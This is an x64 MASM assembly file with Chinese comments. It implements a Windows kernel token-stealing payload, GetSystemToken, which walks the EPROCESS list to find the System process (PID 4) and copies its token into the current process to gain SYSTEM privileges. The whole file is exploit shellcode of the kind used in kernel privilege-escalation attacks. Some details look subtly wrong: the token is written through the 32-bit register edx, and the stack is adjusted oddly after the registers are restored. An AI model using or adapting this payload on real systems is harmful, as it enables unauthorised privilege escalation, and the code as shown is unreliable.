.DATA		;数据段
.CODE		;代码段
GetSystemToken PROC	;定义函数，函数名和cpp文件内声明函数一样


push rax
push rcx
push rdx		;保存寄存器

xor rax, rax
mov rax, gs: [rax + 188h]; 获取 nt!_KPCR.PcrbData.CurrentThread
mov rax, [rax + 070h]; 获取 nt!_KTHREAD.ApcState.Process
mov rcx, rax; 将本进程EPROCESS地址复制到rcx
mov rdx, 4; 

SearchSystemPID:
	mov rax, [rax + 0188h]; 获取 nt!_EPROCESS.ActiveProcessLinks.Flink
	sub rax, 0188h
	cmp [rax + 0180h], rdx; 获取 nt!_EPROCESS.UniqueProcessId
	jne SearchSystemPID; 循环检测是否是SYSTEM进程PID

mov rdx, [rax + 0208h]; 获取System进程的Token
mov[rcx + 0208h], edx; 将本进程Token替换为SYSTEM进程 nt!_EPROCESS.Token

pop rdx			;恢复寄存器
pop rcx
pop rax


add rsp, 40			; 恢复堆栈
xor rax, rax		; 返回状态 SUCCEESS
ret ;`
GetSystemToken ENDP;
END